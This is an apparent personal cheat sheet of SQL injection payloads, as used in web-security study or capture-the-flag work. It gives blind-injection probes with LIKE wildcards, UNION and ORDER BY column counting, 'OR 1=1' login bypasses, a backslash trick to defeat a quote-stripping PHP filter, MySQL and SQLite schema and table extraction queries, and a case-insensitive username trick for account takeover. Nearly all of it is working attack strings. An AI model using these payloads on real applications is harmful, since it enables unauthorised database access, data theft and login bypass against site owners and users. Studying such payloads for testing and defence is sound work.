
###### In the following queries, `'` may not work sometimes, so { `\`\`,`"` } can  be tested
###### To comment out the remaining code, { `;#`,`;--`,`;//` } can be used
###### While doing sqli through urls, { `;#`,`;--`,`;//` } need to be encoded specially 

## Blind SQLI
* `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE "%a%") --`   [It will ask whether a user with letter "a" or "A" containing in his name]
* `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE "__a%") --`	 [It will ask whether the letter is at 3rd place or NOT]

  HERE `%`,`_` are WILDCARDS. `%` matches any string and `_` matches only one character

* By default, LIKE is case-insensitive.

  `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE BINARY "%a%") --` [To make a case sensitive search, use BINARY right after LIKE]


## Finding no of columns in table
* `' UNION SELECT 1,2,3.. FROM table_name`
* `' ORDER BY n`  [If we get error for n, then n-1 will be no of columns]
 
## Limiting no of rows
* `' OR 1=1 LIMIT 1 --`

## Special Bypassing
```   
<?php 
$name = preg_replace("'","",$name);
$pass = preg_replace("'","",$pass);
SELECT * FROM users WHERE username='name' and password='pass'
```
[attack] => user = `\`  & pass = `OR 1=1 --`

## For Mysql
### Finding version and databases
  `' UNION SELECT 1,@@version,database(),4,.....`
### Extracting Tables from databases
  `' union select 1,group_concat(table_name),3... from information_schema.tables where table_schema=database()`
### Extracting columns from databases
  `' union select 1,group_concat(column_name),3... from information_schema.columns where table_schema=database()`
  `' UNION SELECT table_name, column_name, 1 FROM information_schema.columns`

## For sqlite
 In sqlite sqlite_master replaces information_schema
### Extracting table names
  `' UNION SELECT name FROM sqlite_master WHERE type='table'`
### Extracting column names from a table
  `' UNION SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name = 'table_name'`
## Common-errs
* `mysql` does a case insensitive search by default and also ignores the trailing spaces

   How to exploit that?
   
   A username `Admin` can be created and it can be used to sign-in as `admin`
